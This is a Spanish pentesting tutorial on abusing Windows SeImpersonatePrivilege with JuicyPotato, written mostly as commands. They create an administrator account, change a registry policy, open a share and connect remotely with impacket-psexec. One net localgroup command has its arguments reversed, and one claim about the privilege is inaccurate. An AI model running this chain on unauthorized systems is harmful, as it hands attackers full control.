--- 

# SeImpersonatePrivilege 

El privilegio SeImpersonatePrivilege es un privilegio de Windows que permite a un proceso tomar la identidad de otro usuario o cuenta de servicio. Este privilegio es utilizado por los servicios de Windows y otros procesos para llevar a cabo tareas en nombre de un usuario o cuenta de servicio específica, incluso si el proceso que las ejecuta tiene un nivel de privilegio más bajo.

----
# Juicy Potato 

JuicyPotato es una técnica utilizada en el ámbito de la seguridad informática para aprovechar ciertas vulnerabilidades y lograr una escalada de privilegios en sistemas Windows. JuicyPotato se basa en una debilidad en la forma en que Windows maneja los nombres de objetos COM (Component Object Model). Permite a un atacante obtener el privilegio **SeImpersonatePrivilege** para ejecutar código malicioso con los privilegios elevados asociados a dicho privilegio
Para elevar privilegios abusando del privilegio **SeImpersonatePrivilege** haciendo uso de la técnica **Juicy Potato**, podríamos descargarnos el binario encargado de explotar esta vulnerabilidad como [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) o [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1)
En ambos, al traspasarlo a la máquina victima y ejecutarlo, podríamos realizar acciones privilegiadas y ejecutar comandos como el user Administrator.

```powershell
> .\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
```
En este ejemplo solo estamos ejecutando el comando **whoami**, pero podríamos hacer uso de esto para tener completo acceso al sistema: 

Agregamos el usuario y su contraseña al sistema

```powershell
> .\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net user {name} {password} /add" -l 1337
```

Agregamos el usuario creado al grupo **Administrators**

```powershell
>  .\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net localgroup {name} Administrators /add" -l 1337
```

En este punto podríamos verificar con herramientas como **crackmapexec** si ya tenemos acceso al sistema siendo administradores: 

```bash
crackmapexec smb {target_ip} -u '{name}' -p '{password}'
```

En caso de ver un **(Pwned!)** podríamos conectarnos de manera remota con el máximo de privilegios, en caso de que no, aveces suele ser necesario retocar un componente de un registro (**LocalAccountTokenFilterPolicy**)

```powershell
>  .\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
# reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

Por lo que ahora si volvemos a validar con **crackmapexec** veríamos el *(Pwned!)* y podríamos conectarnos con **impacket-psexec** proporcionando el usuario que hemos creado y la contraseña.

```bash
impacket-psexec WORGROUP\{name}@{target_ip} cmd.exe
```

#### IMPORTANTE: 

Es importante a tener en cuenta que a la hora de ejecutar este comando lo que se está intentando realizar es subir un binario malicioso en un recurso compartido a nivel de red en el cual tengamos permisos de escritura, en caso de no existir uno, podría ser necesario adicionalmente crear uno. 

```powershell
>  .\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337
```